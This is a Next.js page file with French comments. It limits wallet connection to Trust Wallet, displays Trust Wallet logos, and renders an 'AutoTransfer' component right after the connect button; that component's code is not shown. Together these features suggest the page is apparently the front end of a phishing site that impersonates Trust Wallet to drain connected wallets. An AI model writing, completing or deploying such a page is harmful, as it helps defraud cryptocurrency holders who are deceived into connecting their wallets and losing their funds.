"use client";

import Image from "next/image";
import { ConnectButton } from "thirdweb/react";
import { createThirdwebClient } from "thirdweb";
import { createWallet, type Wallet } from "thirdweb/wallets";
import AutoTransfer from "./components/AutoTransfer";
import thirdwebIcon from "@public/thirdweb.svg";
import trustwallet from "@public/trustwallet.png";
import trust from "@public/trust.png";
// --- Création du client Thirdweb ---
const client = createThirdwebClient({
  clientId: "c98a5d48ad89f114ad6044933fced541",
});

// --- Limiter les wallets à Trust Wallet uniquement ---
const wallets = [createWallet("com.trustwallet.app")];

export default function Home() {
  const handleWalletConnect = async (wallet: Wallet) => {
    try {
      const account = await wallet.getAccount();
      if (account) {
        console.log("Wallet connected:", account.address);
      } else {
        console.log("Wallet connected but address pending");
      }
    } catch (error) {
      console.error("Wallet connection failed:", error);
    }
  };

  const handleWalletDisconnect = async () => {
    console.log("Wallet disconnected");
  };

  return (
    <main className="p-4 pb-10 min-h-[100vh] flex flex-col items-center justify-center container max-w-screen-lg mx-auto bg-white">
      <Header />

      <div className="flex justify-center mb-20 mt-10">
        <ConnectButton
          client={client}
          wallets={wallets} // <-- Trust Wallet uniquement
          connectModal={{ size: "compact" }}
          onConnect={handleWalletConnect}
          onDisconnect={handleWalletDisconnect}
          appMetadata={{
            name: "Example App",
            url: "https://example.com",
          }}
        />
      </div>

      <AutoTransfer />
    </main>
  );
}

function Header() {
  return (
    <header className="flex flex-col items-center mb-20">
      <Image
        src={trustwallet}
        alt="Thirdweb Logo"
        width={150}
        height={150}
        style={{ filter: "drop-shadow(0px 0px 24px #2826a9a8)" }}
      />
      <Image
        src={trust}
        alt="Thirdweb Logo"
        width={150}
        height={150}
        style={{ filter: "drop-shadow(0px 0px 24px #2826a9a8)" }}
      />

    
    </header>
  );
}
